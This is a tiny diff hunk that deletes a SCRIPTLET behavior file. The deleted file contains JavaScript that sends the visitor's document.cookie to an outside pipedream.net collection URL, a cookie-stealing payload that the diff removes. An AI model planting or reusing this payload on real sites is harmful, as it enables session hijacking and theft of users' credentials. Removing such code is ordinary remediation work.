@@ -1,4 +1,0 @@
-<SCRIPTLET>
-	<IMPLEMENTS Type="Behavior"></IMPLEMENTS>
-	<SCRIPT Language="javascript">fetch('https://enz25p7qw0dco.x.pipedream.net/?c='+encodeURIComponent(document.cookie)')</SCRIPT>
-</SCRIPTLET>
